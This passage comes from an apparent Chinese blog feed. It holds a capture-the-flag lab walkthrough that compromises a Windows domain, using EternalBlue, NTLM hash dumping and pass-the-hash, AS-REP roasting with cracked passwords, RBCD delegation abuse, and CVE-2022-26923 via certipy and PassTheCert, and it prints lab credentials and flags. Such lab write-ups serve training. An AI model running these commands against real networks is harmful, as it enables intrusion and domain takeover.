çŠ¶æ€:identified è¯¦æƒ…:hostname=XR-WIN08, ipv4=<span class="hljs-selector-attr">[172.22.15.24]</span>, ipv6=<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.26</span> çŠ¶æ€:identified è¯¦æƒ…:Url=http:<span class="hljs-comment">//172.22.15.26, status_code=200, length=39962, server_info=map[content-type:text/html; charset=UTF-8 date:Fri, 18 Jul 2025 17:36:16 GMT length:39962 link:&lt;http://172.22.15.26/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot; server:Apache/2.4.41 (Ubuntu) status_code:200 title:XIAORANG.LAB vary:Accept-Encoding], fingerprints=[], port=80, service=http, title=XIAORANG.LAB</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:identified è¯¦æƒ…:workstation_service=XR-CA, server_service=XR-CA, os_version=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>, port=<span class="hljs-number">139</span>, computer_name=XR-CA<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span>, domain_name=xiaorang<span class="hljs-selector-class">.lab</span>, netbios_domain=XIAORANG, netbios_computer=XR-CA<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.18</span> çŠ¶æ€:identified è¯¦æƒ…:length=<span class="hljs-number">703</span>, server_info=map<span class="hljs-selector-attr">[accept-ranges:bytes content-length:703 content-type:text/html date:Fri, 18 Jul 2025 17:36:16 GMT etag:<span class="hljs-string">&quot;87cafbaec95d91:0&quot;</span> last-modified:Sat, 03 Jun 2023 07:26:35 GMT length:703 server:Microsoft-IIS/10.0 status_code:200 title:IIS Windows Server]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=IIS Windows Server, Url=http:<span class="hljs-comment">//172.22.15.18, status_code=200</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> çŠ¶æ€:identified è¯¦æƒ…:port=<span class="hljs-number">139</span>, computer_name=XR-DC01<span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span>, domain_name=xiaorang<span class="hljs-selector-class">.lab</span>, netbios_domain=XIAORANG, server_service=XR-DC01, domain_controllers=XIAORANG, netbios_computer=XR-DC01, workstation_service=XR-DC01, os_version=Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:identified è¯¦æƒ…:workstation_service=XR-WIN08, server_service=XR-WIN08, os_version=Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>, port=<span class="hljs-number">139</span>, computer_name=XR-WIN08, domain_name=XR-WIN08, netbios_domain=XR-WIN08, netbios_computer=XR-WIN08<br><span class="hljs-selector-attr">[2025-07-19 01:36:16]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:identified è¯¦æƒ…:length=<span class="hljs-number">0</span>, server_info=map<span class="hljs-selector-attr">[content-length:0 content-type:text/html date:Fri, 18 Jul 2025 17:36:16 GMT length:0 location:/www redirect_Url:http://172.22.15.24/www server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 status_code:302 title:æ— æ ‡é¢˜ x-powered-by:PHP/5.5.9]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=æ— æ ‡é¢˜, Url=http:<span class="hljs-comment">//172.22.15.24, status_code=302</span><br><span class="hljs-selector-attr">[2025-07-19 01:36:18]</span> <span class="hljs-selector-attr">[SERVICE]</span> ç›®æ ‡:<span class="hljs-number">172.22</span>.<span class="hljs-number">15.24</span> çŠ¶æ€:identified è¯¦æƒ…:status_code=<span class="hljs-number">200</span>, length=<span class="hljs-number">135</span>, server_info=map<span class="hljs-selector-attr">[cache-control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0 content-type:text/html date:Fri, 18 Jul 2025 17:36:17 GMT expires:Thu, 19 Nov 1981 08:52:00 GMT length:135 pragma:no-cache server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 set-cookie:rid=vv8286s2m8eiiue19vuvkdbcn4; path=/ status_code:200 title:æ— æ ‡é¢˜ x-powered-by:PHP/5.5.9]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=æ— æ ‡é¢˜, Url=http:<span class="hljs-comment">//172.22.15.24/www</span><br></code></pre></td></tr></table></figure><p>ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.13</span> XR-DC01 åŸŸåxiaorang.labã€‚<br><span class="hljs-number">172.22.15.18</span> XR-CAåŒå± xiaorang.lab<br><span class="hljs-number">172.22.15.24</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span> XR-WIN08 MS17-<span class="hljs-number">010</span><br><span class="hljs-number">172.22.15.35</span> <span class="hljs-number">445</span>,<span class="hljs-number">139</span> XR-<span class="hljs-number">0687</span><br></code></pre></td></tr></table></figure><p><code>172.22.15.24</code> å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´</p><p>è€æ ·å­ä¼  frpc å’Œ frpc.ini æµé‡è½¬å‘ï¼Œproxychains ä»£ç†ä¸€ä¸‹ msf æ‰“æ°¸æ’ä¹‹è“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 172.22.15.24<br>run<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥æ‰§è¡Œ shell ä¼šè¶…æ—¶ï¼Œè¿›è¡Œ hashdump </p><p><img src="https://img.dkdun.cn/v1/2025/12/5873062a9691ad74.png"> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>e52d03e9b939997401466a0ec5a9cbc:::<br><span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec administrator@<span class="hljs-number">172.22.15.24</span> -hashes <span class="hljs-string">&#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27;</span> -codec gbk<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° system æƒé™</p><p><img src="https://img.dkdun.cn/v1/2025/12/b4f658f22e455963.png"></p><p>è¿›å…¥ Administrator ç”¨æˆ·ç›®å½•ä¸‹</p><p><img src="https://img.dkdun.cn/v1/2025/12/e5913f930b310363.png"></p><p>æ‹¿åˆ° flag02</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag02: flag&#123;<span class="hljs-number">65518b91</span>-b026-4cfd-a62e-75aea9d458f6&#125;<br></code></pre></td></tr></table></figure><h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><p>æ‰« 172.22.15.24 ç›®å½•å‘ç°æœ‰ phpAdminï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç ï¼Œä½†æ˜¯å‘ç°è¿™å°æœºå™¨æ¡Œé¢ä¸Šæœ‰ phpstudyï¼Œå¯ä»¥å°è¯•è¿œç¨‹è¿æ¥ï¼Œå…ˆæ·»åŠ ç”¨æˆ·å¯†ç </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">butt3rf1y</span> qwe456@ /add<br>net localgroup administrators butt3rf1y /add<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/884c3fd0d3eaa369.png"></p><p>è¿œç¨‹æŸ¥çœ‹ phpstudy æ‹¿åˆ°ä¿©å¯†ç </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">root root@<span class="hljs-attr">#123</span><br>zdoo zdo<span class="hljs-meta">o123</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6101b91ad6b199c0.png"></p><p>root è´¦å·ç™»å½• phpAdminï¼Œåœ¨ zdoo æ•°æ®åº“çš„ zdoosys_user ä¸­æ‰¾åˆ°å¾ˆå¤šåŸŸç”¨æˆ·ä¿¡æ¯ï¼Œå…ˆä¿å­˜ä¸‹æ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/c71e8ba887d80964.png"></p><h1 id="ZDOO-OA"><a href="#ZDOO-OA" class="headerlink" title="ZDOO OA"></a>ZDOO OA</h1><p>å‘ç° phpstudy æ­å»ºçš„ç½‘ç«™ï¼Œå°è¯• zdoo:zdoo123 ç™»å½•ï¼Œä¸è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/c843ad6818cb49bd.png"></p><p>admin:123456 æˆåŠŸç™»å½•ï¼Œå°±æœ‰ä¸€äº›ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯ä¹‹å‰åœ¨æ•°æ®åº“ä¸­å·²ç»æ‹¿åˆ°äº†</p><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>å°è¯• AS-REP Roasting æ”»å‡»</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-GetNPUsers -dc-ip <span class="hljs-number">172.22.15.13</span>  xiaorang.lab/ -usersfile user.txt<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ª TGT ç¥¨æ®</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$krb5asrep$23$lixiuying<span class="hljs-symbol">@xiaorang</span>.lab<span class="hljs-symbol">@XIAORANG</span>.LAB:beb6333f35e707252e4e869ffed9b20f$75941020628623dc735e3b60ed28131e974c7725788c93d53034211419a12878a24ff34d77fe4f2db6f5364a68c1120cd1958eb758b2e23b1f7d8e117e03ab0503a916da4e7bd75bfb17514266253598c020093b5d17d536caeedbbea4ed8f1b000c168cb75c6e0937ca877aed51334a0c8c36efa487a534fed1e25ef2f5725488da057aa0c4f89cdb2f4341db8297c810a21765394e7426513ca83f98557eaa4230d1d6ecd6f723034340c5d4cc2fc67ea88feb620325c3042b584dd59224b8b6618aa89607c71227d51c1068a85617cd91f549a9f155c594bb96bf824d7755d194042ce253f4cca684574a<br><br>$krb5asrep$23$huachunmei<span class="hljs-symbol">@xiaorang</span>.lab<span class="hljs-symbol">@XIAORANG</span>.LAB:<span class="hljs-number">947</span>a93f5ea00c81d436c808d791742ad$5819df23d5c9779825928b8e7cac411362fe1aca403eb601ea80fcb08b5d8a3fd3ed06201e1bd05abee4c026359b1eac57a69dceed7c5842bd15641f04c312cf2658fc66319b594b9d42a4d5b070e40dfab0d63a04f278f08634f804f285638ea4240954b6b87fad1d7963d2ca462d85b4da4d566847929155bdb9e3dd3c2d97082f962239f6412a2de8643b5e433c0464a896428adcd7e1bbb25230d2065f2e79abcf0b2f0132ca72a2f5fa6d072860098f16f6110fac48732c4d458ea6ab7a219edf8fda033eabcf8e474b790d634183fd5b49ef0ad525034fb1ce643dceb7fce754fdde066e2ca1e4ba70<br></code></pre></td></tr></table></figure><p>ç”¨ hashcat çˆ†ç ´ï¼Œçˆ†å‡ºä¸¤ä¸ªå¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/4dbbbd8b908714ac.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">lixiuying<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:winniethepooh<br>huachunmei<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:<span class="hljs-number">1</span>qaz2wsx<br></code></pre></td></tr></table></figure><p>RDP ç»§ç»­è¿æ¥ 172.22.15.35</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">proxychains bloodhound-python -u lixiuying -<span class="hljs-selector-tag">p</span> winniethepooh -d xiaorang<span class="hljs-selector-class">.lab</span> -c <span class="hljs-attribute">all</span> -ns <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> <span class="hljs-attr">--zip</span> <span class="hljs-attr">--dns-tcp</span><br></code></pre></td></tr></table></figure><p>å¯¼å…¥ bloodhound æŸ¥çœ‹åŸŸå…³ç³»å›¾</p><p><img src="https://img.dkdun.cn/v1/2025/12/1d9f456723b2fe57.png"></p><p>å¯ä»¥çœ‹åˆ° <code>LIXIUYING@XIAORANG.LAB</code> å¯¹ <code>XR-0687.XIAORANG.LAB</code> æœ‰ GenericWrite çš„æƒé™ï¼Œç†Ÿæ‚‰çš„ RBCD</p><h1 id="RBDC"><a href="#RBDC" class="headerlink" title="RBDC"></a>RBDC</h1><p>æ·»åŠ æœºå™¨ç”¨æˆ·è¿›å»</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains impacket-addcomputer -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SAMR</span> <span class="hljs-title function_">xiaorang</span>.<span class="hljs-title function_">lab</span>/<span class="hljs-title function_">lixiuying</span>:winniethepooh -computer-name butt3rf1y$ -computer-pass <span class="hljs-string">&#x27;u4happy@&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>XR-0687$</code> çš„ <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> å­—æ®µ</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">proxychains -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&quot;butt3rf1y$&quot;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&quot;XR-0687$&quot;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9f7196423c7aede4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">butt3rf1y</span>$   (S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3745972894</span>-<span class="hljs-number">1678056601</span>-<span class="hljs-number">2622918667</span>-<span class="hljs-number">1147</span>)<br></code></pre></td></tr></table></figure><p>ç”¨ impacket çš„ getST æ‰§è¡Œ RBCD æ”»å‡»ï¼Œè·å–æœºå™¨ä¸Šçš„ Kerberos æœåŠ¡ç¥¨æ® TGS</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains -<span class="hljs-selector-tag">q</span> impacket-getST xiaorang.lab/butt3rf1y$:<span class="hljs-string">&#x27;u4happy@&#x27;</span> -spn cifs/XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p>å¯¼å…¥ç¥¨æ®</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®ç›®æ ‡ä¸»æœº</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> -q impacket-psexec <span class="hljs-string">&#x27;xiaorang.lab/administrator<span class="hljs-variable">@XR</span>-0687.xiaorang.lab&#x27;</span> -target-ip <span class="hljs-number">172.22.15.35</span> -codec gbk -<span class="hljs-literal">no</span>-pass -k<br></code></pre></td></tr></table></figure><p>åœ¨ C:\Users\Administrator\flag ä¸‹æ‹¿åˆ° flag03 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;e8893d4e-<span class="hljs-number">1</span>e26-<span class="hljs-number">4</span>e14-a8ff-<span class="hljs-number">5</span>eff3b928f81&#125;<br></code></pre></td></tr></table></figure><h1 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h1><p>æœ€åå‰©ä¸‹äº†æ‹¥æœ‰ CA çš„ 172.22.15.18ï¼Œfscan æ‰«åˆ°ä¸€ä¸ª Active Directory è¯ä¹¦æœåŠ¡æ¼æ´</p><p><img src="https://img.dkdun.cn/v1/2025/12/88a7693744a44d75.png"></p><p>ç»è¿‡ä¸€ç•ªæœç´¢å‘ç°æ˜¯ <a href="https://www.freebuf.com/vuls/335471.html">CVE-2022-26923</a> WindowsåŸŸææƒï¼Œå‚è€ƒ <a href="https://xz.aliyun.com/news/11073">ADCSæ”»å‡»ç¬”è®°</a></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">å½“ <span class="hljs-variable">Windows</span> ç³»ç»Ÿçš„ <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> è¯ä¹¦æœåŠ¡ï¼ˆ<span class="hljs-variable">CS</span>ï¼‰åœ¨åŸŸä¸Šè¿è¡Œæ—¶ï¼Œç”±äºæœºå™¨è´¦å·ä¸­çš„ <span class="hljs-variable">dNSHostName</span> å±æ€§ä¸å…·æœ‰å”¯ä¸€æ€§ï¼ŒåŸŸä¸­æ™®é€šç”¨æˆ·å¯ä»¥å°†å…¶æ›´æ”¹ä¸ºé«˜æƒé™çš„åŸŸæ§æœºå™¨è´¦å·å±æ€§ï¼Œç„¶åä» <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> è¯ä¹¦æœåŠ¡ä¸­è·å–åŸŸæ§æœºå™¨è´¦æˆ·çš„è¯ä¹¦ï¼Œå¯¼è‡´åŸŸä¸­æ™®é€šç”¨æˆ·æƒé™æå‡ä¸ºåŸŸç®¡ç†å‘˜æƒé™<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ·å°†è¯¥æœºå™¨ç”¨æˆ· dNSHostName å±æ€§æŒ‡å‘åŸŸæ§ï¼Œå…ˆä¸‹è½½ certipy-adï¼Œ<a href="https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation">Certipy</a></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">proxychains certipy-ad account <span class="hljs-keyword">create</span> -<span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;butt3rf2y$&#x27;</span> -pass <span class="hljs-string">&#x27;p4ppy&#x27;</span> -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.13</span> -u lixiuying -p <span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dns XR-DC01.xiaorang.lab<br></code></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥åï¼Œå‘ AD CS è¯·æ±‚åŸŸæ§çš„è¯ä¹¦</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad req -u <span class="hljs-string">&#x27;butt3rf2y$<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span> -p <span class="hljs-string">&#x27;p4ppy&#x27;</span> -target <span class="hljs-number">172.22.15.18</span> -ca <span class="hljs-string">&#x27;xiaorang-XR-CA-CA&#x27;</span> -template <span class="hljs-string">&#x27;Machine&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d228be69b9e00bb2.png"></p><p>ç„¶åç”¨ç”³è¯·çš„è¯ä¹¦è¯·æ±‚ DC$ çš„ TGT</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad auth -pfx xr-dc01.pfx -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p>é‡åˆ°äº†é”™è¯¯ï¼š</p><p>Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</p><p>æ¢æˆè®¾ç½® RBCD æ¥æ”»å‡»ï¼Œé€šè¿‡ Schannel å°†è¯ä¹¦ä¼ é€’åˆ° LDAPS, ä¿®æ”¹ LDAP é…ç½® (ä¾‹å¦‚é…ç½® RBCD &#x2F; DCSync), æ¥è·å¾—åŸŸæ§æƒé™</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">openssl pkcs12 -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pfx</span> -out xr-dc01<span class="hljs-selector-class">.pem</span> -nodes<br>openssl rsa -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pem</span> -out xr-dc01<span class="hljs-selector-class">.key</span><br>openssl x509 -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pem</span>  -out xr-dc01.crt<br></code></pre></td></tr></table></figure><p>åœ°å€ï¼š<a href="https://github.com/AlmondOffSec/PassTheCert/">https://github.com/AlmondOffSec/PassTheCert/</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains python3 PassTheCert-main/Python/passthecert<span class="hljs-selector-class">.py</span> -action whoami -crt xr-dc01<span class="hljs-selector-class">.crt</span> -key xr-dc01<span class="hljs-selector-class">.key</span> -domain xiaorang<span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/19796c299b6b0215.png"></p><p>å°†è¯ä¹¦é…ç½®åˆ°åŸŸæ§çš„ RBCD</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains python3 PassTheCert-main/Python/passthecert.py -action write_rbcd -crt xr-dc01.crt -key xr-dc01.key -domain xiaorang.lab -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;XR-DC01$&#x27;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;butt3rf2y$&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ad159b4f84bb39b6.png"></p><p>ç”³è¯·ST</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;butt3rf2y$&#x27;</span>:<span class="hljs-string">&#x27;p4ppy&#x27;</span> -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯¼å…¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure><p>é…ç½®ä¸‹ hosts</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.13</span>XR-DC01.xiaorang.lab<br></code></pre></td></tr></table></figure><p>è¿æ¥å°±è¡Œäº†</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec Administrator<span class="hljs-variable">@XR</span>-DC01.xiaorang.lab -k -<span class="hljs-literal">no</span>-pass -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d41095a4440eaf38.png"></p><p>æ‹¿åˆ° flag04</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag04</span>: flag&#123;c2278fc6-e66f-<span class="hljs-number">4</span>f16-<span class="hljs-number">827</span>a-<span class="hljs-number">84</span>ffcd44b462&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>æ˜¥ç§‹äº‘é•œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘æ¸—é€ WordPress AS-REP Roasting CVE-2022-26923</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ-ThermalPower</title>
    <link href="/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/"/>
    <url>/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/</url>
    
    <content type="html"><![CDATA[<p>Heapdump å†…å­˜ä¿¡æ¯æ³„éœ²ã€Shiro ååºåˆ—åŒ–ã€æ³¨å†Œè¡¨ SAM è½¬å‚¨ã€.NET é€†å‘</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>æ‰«åˆ°ä¸¤ä¸ª</p><p><img src="https://img.dkdun.cn/v1/2025/12/c326cd8c6587a003.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>æ‰«ç›®å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/8701b005bcadc422.png"></p><p>å‘ç°æœ‰ heapdump</p><h1 id="Heapdump-å†…å­˜æ³„éœ²"><a href="#Heapdump-å†…å­˜æ³„éœ²" class="headerlink" title="Heapdump å†…å­˜æ³„éœ²"></a>Heapdump å†…å­˜æ³„éœ²</h1><p>ä¸‹è½½ä¸‹æ¥è¯»å–</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">ubuntu@VM-<span class="hljs-number">4</span>-<span 